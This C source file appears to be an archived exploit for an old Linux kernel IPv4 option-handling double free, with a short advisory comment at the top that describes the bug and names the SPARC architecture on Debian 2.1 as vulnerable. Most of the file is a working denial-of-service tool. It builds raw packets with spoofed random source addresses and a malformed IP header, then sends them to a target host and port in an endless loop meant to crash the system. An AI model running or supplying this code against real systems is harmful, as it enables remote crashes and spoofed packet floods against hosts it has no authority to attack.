/*
source: http://www.securityfocus.com/bid/302/info

A vulnerability in the Linux Kernel's IPv4 option processing may allow a remote user to crash the system.

The vulnerability is the result of the kernel freeing a socket buffer when it shouldn't while sending an ICMP Parameter Problem error message in response to an IP packet with a malformed IP option. This results in the buffer being freed twice and in memory corruption.

Of the Debian Linux 2.1 supported architectures only the SPARC one is vulnerable. 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>

struct icmp_hdr
{
    struct iphdr iph;
    struct icmp icp;
    char text[1002];
} icmph;

int in_cksum(int *ptr, int nbytes)
{
    long sum;
    u_short oddbyte, answer;
    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return(answer);
}

struct sockaddr_in sock_open(char *address, int socket, int prt)
{
        struct hostent *host;
        if ((host = gethostbyname(address)) == NULL)
        {
                perror("Unable to get host name");
                exit(-1);
        }       
        struct sockaddr_in sin;
        bzero((char *)&sin, sizeof(sin));
        sin.sin_family = PF_INET;
        sin.sin_port = htons(prt);
        bcopy(host->h_addr, (char *)&sin.sin_addr, host->h_length);
        return(sin);
}
 
void main(int argc, char **argv)
{
        int sock, i, ctr, k;
        int on = 1;
        struct sockaddr_in addrs;
        if (argc < 3)
        {
                printf("Usage: %s <ip_addr> <port>\n", argv[0]);
                exit(-1);
        }   
        for (i = 0; i < 1002; i++)
        {
            icmph.text[i] = random() % 255;
        }
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1)
        {
            perror("Can't set IP_HDRINCL option on socket");
        }
        if (sock < 0)
        {
            exit(-1);
        }
        fflush(stdout);
        for (ctr = 0;ctr < 1001;ctr++)
        {
            ctr = ctr % 1000;
            addrs = sock_open(argv[1], sock, atoi(argv[2]));
            icmph.iph.version = 4;
            icmph.iph.ihl = 6;
            icmph.iph.tot_len = 1024;
            icmph.iph.id = htons(0x001);
            icmph.iph.ttl = 255;
            icmph.iph.protocol = IPPROTO_ICMP;
            icmph.iph.saddr = ((random() % 255) * 255 * 255 * 255) +
            ((random() % 255) * 65535) + 
            ((random() % 255) * 255) +
            (random() % 255);
            icmph.iph.daddr = addrs.sin_addr.s_addr;
            icmph.iph.frag_off = htons(0);
            icmph.icp.icmp_type = random() % 14;
            icmph.icp.icmp_code = random() % 10;
            icmph.icp.icmp_cksum = 0;
            icmph.icp.icmp_id = 2650;
            icmph.icp.icmp_seq = random() % 255;
            icmph.icp.icmp_cksum = in_cksum((int *)&icmph.icp, 1024);
            if (sendto(sock, &icmph, 1024, 0, (struct sockaddr *)&addrs,sizeof(struct sockaddr)) == -1)
            {
                if (errno != ENOBUFS) printf("X");
            }
            if (ctr == 0) printf("b00m ");
            fflush(stdout);
        }
        close(sock);
} 